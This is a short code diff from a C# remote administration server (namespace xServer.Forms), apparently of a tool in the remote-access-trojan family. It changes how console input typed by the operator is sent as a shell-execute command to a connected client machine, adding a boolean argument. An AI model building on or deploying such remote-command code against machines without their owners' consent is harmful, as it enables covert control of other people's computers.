@@ -74,7 +74,7 @@ namespace xServer.Forms
                             txtConsoleOutput.Text = string.Empty;
                             break;
                         default:
-                            new Core.Packets.ServerPackets.DoShellExecute(input).Execute(_connectClient);
+                            new Core.Packets.ServerPackets.DoShellExecute(input,false).Execute(_connectClient);
                             break;
                     }
                 }
